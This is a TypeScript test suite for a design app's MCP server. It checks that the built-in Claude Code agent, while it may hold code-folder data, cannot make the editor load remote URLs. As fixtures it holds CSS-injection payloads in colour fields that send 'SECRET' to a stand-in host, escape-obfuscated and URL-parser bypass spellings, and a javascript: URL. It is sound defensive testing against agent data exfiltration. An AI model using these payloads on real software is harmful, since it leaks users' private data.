// Calls from the app's own Claude Code agent. Rust tells the page which
// requests carried the agent's token, and while that agent may hold something
// read from a code folder, one check at the tools/call dispatch refuses
// anything that could make the editor load a web address: a picture source
// that leaves the machine, or CSS in a colour. Words that only mention a site
// still go through.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  WEB_LINKS_OFF,
  createSerialMcpRunner,
  handleMcpMessage,
  hasWebLink,
  type McpDesignApi,
} from '@/lib/mcp/desktopMcpServer';

/**
 * An api that says yes to everything, and records what the tools asked it.
 * `reads`: the agent's process can read a folder now. `mayHold`: the chat's
 * agent read one at some point, which a process that reads one implies.
 */
function fakeApi(state: { reads?: boolean; mayHold?: boolean } = {}): { api: McpDesignApi; calls: string[] } {
  const reads = state.reads ?? false;
  const mayHold = state.mayHold ?? reads;
  const calls: string[] = [];
  const api = new Proxy({} as McpDesignApi, {
    get: (_target, key) => {
      if (key === 'agentReadsFolders') return () => reads;
      if (key === 'agentMayHoldFolderData') return () => mayHold;
      return (..._args: unknown[]) => {
        calls.push(String(key));
        return true;
      };
    },
  });
  return { api, calls };
}

let nextId = 1;
function call(name: string, args: Record<string, unknown>) {
  return { jsonrpc: '2.0', id: nextId++, method: 'tools/call', params: { name, arguments: args } };
}

type CallResult = { result?: { isError?: boolean; content?: Array<{ type: string; text?: string }> } };
const textOf = (response: unknown) => (response as CallResult).result?.content?.[0]?.text ?? '';
const refused = (response: unknown) =>
  (response as CallResult).result?.isError === true && textOf(response) === WEB_LINKS_OFF;

// set_background writes its colours into a CSS gradient as given.
const INJECTED_GRADIENT = {
  gradient: { color1: 'red), url("https://x.example/?d=SECRET"), linear-gradient(red', color2: 'blue', angle: 90 },
};
const ESCAPED_GRADIENT = {
  gradient: { color1: 'red), u\\rl(https://x.example/?d=SECRET), linear-gradient(red', color2: 'blue', angle: 90 },
};

/**
 * Spellings the browser loads from another host. Its URL parser drops a tab
 * or a newline anywhere and control characters at the ends, and on the
 * editor's http origin it reads a backslash as a slash.
 */
const LEAVING = [
  'https://x.example/a.png?d=SECRET',
  'h\tttps://x.example/a.png',
  'ht\ntps://x.example/a.png',
  'https\r://x.example/a.png',
  '\u0001https://x.example/a.png',
  '\u0000https://x.example/a.png',
  '  HTTP://x.example/v.mp4 ',
  'https:x.example/logo.png',
  '//x.example/p.png',
  '/\\x.example/a.png',
  '\\\\x.example/a.png',
  '/\t/x.example/a.png',
  '/\n/x.example/a.png',
  '\t//x.example/a.png',
  'wss://x.example/socket',
  'ftp://x.example/f',
  'file://server/share/f.png',
  'javascript:alert(1)',
  'data:text/html,<img src=https://x.example>',
  'x.example/a.png',
];

/** Sources that never leave the machine, in the forms the app itself writes. */
const LOCAL = [
  '',
  'asset:asset_1727_ab12cd',
  'data:image/png;base64,iVBORw0KGgo=',
  'DATA:IMAGE/SVG+XML,<svg/>',
  'data:video/mp4;base64,AAAA',
  'blob:http://tauri.localhost/0b6c2a6e-6f3c-4f0e-9d3a-1b2c3d4e5f60',
  '/devices/iphone.png',
  '/data/projects/a%20b.png',
];

test('a source that would leave the machine is refused, whatever its spelling', () => {
  for (const imageSrc of LEAVING) assert.equal(hasWebLink({ imageSrc }), true, JSON.stringify(imageSrc));
  for (const imageSrc of LOCAL) assert.equal(hasWebLink({ imageSrc }), false, JSON.stringify(imageSrc));
  // Any key that names a source, anywhere in the tree.
  assert.equal(hasWebLink({ videoSrc: '  HTTP://x.example/v.mp4 ' }), true);
  assert.equal(hasWebLink({ posterSrc: '//x.example/p.png' }), true);
  assert.equal(hasWebLink({ source: 'https:x.example/logo.png' }), true);
  assert.equal(hasWebLink({ url: 'wss://x.example/socket' }), true);
  assert.equal(hasWebLink({ href: 'ftp://x.example/f' }), true);
  assert.equal(hasWebLink({ screenshots: [{ elementId: 'el_1', src: 'h\tttps://x.example/s.png' }] }), true);
  assert.equal(hasWebLink({ elements: [{ type: 'image', props: { customFrameSrc: '/\\x.example/f.png' } }] }), true);
  // The items of an array answer to the key that holds it.
  assert.equal(hasWebLink({ src: ['asset:asset_1', 'https://x.example/second.png'] }), true);
  assert.equal(hasWebLink({ source: 'data:image/png;base64,iVBORw0KGgo=' }), false);
  assert.equal(hasWebLink({ screenshotSrc: '/devices/iphone.png' }), false);
  // A Windows path is no source and holds no CSS, backslashes and all.
  assert.equal(hasWebLink({ path: 'C:\\Users\\me\\code\\Marbly\\ios\\icon.png' }), false);
});

test('CSS that loads something is found in any string, a colour most of all, its escapes undone', () => {
  assert.equal(hasWebLink(INJECTED_GRADIENT), true);
  assert.equal(hasWebLink(ESCAPED_GRADIENT), true);
  assert.equal(hasWebLink({ gradient: { color1: 'red), \\75 rl(https://x.example/?d=S)', color2: 'blue', angle: 0 } }), true);
  assert.equal(hasWebLink({ gradient: { color1: 'red), \\000075rl(https://x.example)', color2: 'blue', angle: 0 } }), true);
  assert.equal(hasWebLink({ fillColor: 'image-set("https://x.example/a.png" 1x)' }), true);
  assert.equal(hasWebLink({ fillColor: 'image-se\\t("https://x.example/a.png" 1x)' }), true);
  assert.equal(hasWebLink({ fillColor: '\\69mage-set("https://x.example/a.png" 1x)' }), true);
  // A hex digit after the backslash starts a code point, as the browser reads
  // it: \e is U+000E here, so this names no function that loads anything.
  assert.equal(hasWebLink({ fillColor: 'image-s\\et("x" 1x)' }), false);
  assert.equal(hasWebLink({ fillGradient: { color1: '\\55 RL(https://x.example)', color2: '#fff', angle: 0 } }), true);
  assert.equal(hasWebLink({ clipPath: '\\75 rl(https://x.example/c.svg#m)' }), true);
  assert.equal(hasWebLink({ shadow: { color: 'URL(https://x.example)' } }), true);
  assert.equal(hasWebLink({ shadow: { color: 'u\\72l(https://x.example)' } }), true);
  assert.equal(hasWebLink({ backgroundColor: '#7C5CFF', gradient: { color1: '#000', color2: 'rgba(0,0,0,0.5)', angle: 0 } }), false);
  assert.equal(hasWebLink({ content: 'A back\\slash is not CSS' }), false);
});

test('words that mention a site are words', () => {
  assert.equal(hasWebLink({ content: 'Read the guide at https://marbly.app/help' }), false);
  assert.equal(hasWebLink({ name: 'https://marbly.app', content: 'Visit //marbly' }), false);
  assert.equal(hasWebLink({ writes: [{ elementId: 'el_9', locale: 'de', text: 'Mehr auf https://marbly.app' }] }), false);
  assert.equal(hasWebLink({}), false);
  assert.equal(hasWebLink(null), false);
});

test('the agent reading a folder cannot send a web link, and a mention still goes', async () => {
  const { api, calls } = fakeApi({ reads: true });
  const agent = { agent: true };

  for (const args of [INJECTED_GRADIENT, ESCAPED_GRADIENT]) {
    assert.equal(refused(await handleMcpMessage(call('set_background', args), api, agent)), true);
  }
  assert.equal(calls.includes('setBackground'), false, 'the refused calls never reached the editor');

  for (const imageSrc of ['https://x.example/?d=1', 'h\tttps://x.example/?d=1', '\u0001https://x.example/?d=1']) {
    const picture = await handleMcpMessage(call('update_element', { elementId: 'el_1', imageSrc }), api, agent);
    assert.equal(refused(picture), true, JSON.stringify(imageSrc));
  }
  for (const src of ['/\\x.example/s.png', '/\t/x.example/s.png']) {
    const fill = await handleMcpMessage(
      call('apply_template', { templateId: 'template_droply', screenshots: [{ elementId: 'el_1', src }] }),
      api,
      agent
    );
    assert.equal(refused(fill), true, JSON.stringify(src));
  }
  assert.equal(calls.includes('updateElement') || calls.includes('applyTemplate'), false);

  const mention = await handleMcpMessage(
    call('update_element', { elementId: 'el_1', content: 'More at https://marbly.app' }),
    api,
    agent
  );
  assert.equal((mention as CallResult).result?.isError, undefined);
  assert.ok(calls.includes('updateElement'));
});

test('the check is for the agent while it may hold folder data, not for anyone else', async () => {
  // Another MCP client (the Settings switch), the web relay and the CLI.
  const other = fakeApi({ reads: true });
  const fromElsewhere = await handleMcpMessage(call('set_background', INJECTED_GRADIENT), other.api, { agent: false });
  assert.equal(refused(fromElsewhere), false);
  assert.ok(other.calls.includes('setBackground'));
  assert.equal(refused(await handleMcpMessage(call('set_background', INJECTED_GRADIENT), fakeApi({ reads: true }).api)), false);
  // Rust's word on folders means nothing for a client that is not the agent.
  const vouched = await handleMcpMessage(call('set_background', INJECTED_GRADIENT), fakeApi().api, { agent: false, folders: true });
  assert.equal(refused(vouched), false);

  // The agent in a chat that never had a folder.
  const noFolder = fakeApi();
  const withoutFolder = await handleMcpMessage(call('set_background', INJECTED_GRADIENT), noFolder.api, { agent: true });
  assert.equal(refused(withoutFolder), false);
  assert.equal(
    refused(await handleMcpMessage(call('set_background', INJECTED_GRADIENT), noFolder.api, { agent: true, folders: false })),
    false
  );
});

test('a chat that read a folder, or Rust saying a process can read one, keeps the check on', async () => {
  // The folder is gone and so is the process that read it, but the
  // conversation the agent resumes still holds what it read.
  const resumed = fakeApi({ reads: false, mayHold: true });
  assert.equal(refused(await handleMcpMessage(call('set_background', INJECTED_GRADIENT), resumed.api, { agent: true })), true);

  // The page has lost track of a process that is still alive (a reload
  // before adoption, a chat left while its process is killed): Rust knows.
  const lost = fakeApi();
  assert.equal(
    refused(await handleMcpMessage(call('set_background', INJECTED_GRADIENT), lost.api, { agent: true, folders: true })),
    true
  );
  assert.equal(lost.calls.includes('setBackground'), false);

  // An api that cannot answer counts as yes.
  const broken = new Proxy({} as McpDesignApi, {
    get: (_target, key) => {
      if (key === 'agentMayHoldFolderData') {
        return () => {
          throw new Error('not ready');
        };
      }
      return () => true;
    },
  });
  assert.equal(refused(await handleMcpMessage(call('set_background', INJECTED_GRADIENT), broken, { agent: true })), true);
});

test('the serial runner carries the caller its transport vouched for', async () => {
  const { api } = fakeApi({ reads: true });
  const run = createSerialMcpRunner(() => api);
  assert.equal(refused(await run(call('set_background', INJECTED_GRADIENT), { agent: true })), true);
  const unaware = createSerialMcpRunner(() => fakeApi().api);
  assert.equal(refused(await unaware(call('set_background', INJECTED_GRADIENT), { agent: true, folders: true })), true);
});

test('a template fill is probed only when it stays on this site', async () => {
  // The probe is a real request: it must never go to another host, whoever asked.
  const probes: string[] = [];
  const scope = globalThis as { Image?: unknown };
  const saved = scope.Image;
  scope.Image = class {
    onload: (() => void) | null = null;
    onerror: (() => void) | null = null;
    set src(value: string) {
      probes.push(value);
      setTimeout(() => this.onerror?.(), 0);
    }
  };
  try {
    const { api } = fakeApi();
    for (const src of ['/\\x.example/s.png', '/\t/x.example/s.png']) {
      const answer = await handleMcpMessage(
        call('apply_template', { templateId: 'template_droply', screenshots: [{ elementId: 'el_1', src }] }),
        api
      );
      assert.match(textOf(answer), /is not a source the app can load/);
    }
    assert.deepEqual(probes, []);
    const onSite = await handleMcpMessage(
      call('apply_template', { templateId: 'template_droply', screenshots: [{ elementId: 'el_1', src: '/devices/iphone.png' }] }),
      api
    );
    assert.match(textOf(onSite), /is not an image this app serves/);
    assert.deepEqual(probes, ['/devices/iphone.png']);
  } finally {
    scope.Image = saved;
  }
});

test('import_project_image is listed for every client and works only for the agent in the desktop app', async () => {
  const listed = (await handleMcpMessage({ jsonrpc: '2.0', id: 1, method: 'tools/list' }, null)) as {
    result: { tools: Array<{ name: string; description: string; inputSchema: { required?: string[] } }> };
  };
  const tool = listed.result.tools.find((entry) => entry.name === 'import_project_image');
  assert.ok(tool, 'tools/list has import_project_image');
  assert.ok(
    tool.description.startsWith(
      'Desktop app only, for the built-in Claude Code agent with a code folder attached to its chat.'
    )
  );
  assert.deepEqual(tool.inputSchema.required, ['path']);

  const { api, calls } = fakeApi({ reads: true });
  const notTheAgent = await handleMcpMessage(call('import_project_image', { path: '/code/marbly/icon.png' }), api, {
    agent: false,
  });
  assert.equal((notTheAgent as CallResult).result?.isError, true);
  assert.equal(
    textOf(notTheAgent),
    "import_project_image works only for the app's built-in Claude Code agent, in a chat with a code folder attached"
  );
  // node is not the desktop app either, so even the agent is refused here.
  const outsideTauri = await handleMcpMessage(call('import_project_image', { path: '/code/marbly/icon.png' }), api, {
    agent: true,
  });
  assert.equal((outsideTauri as CallResult).result?.isError, true);
  assert.equal(calls.includes('importProjectImage'), false);
});
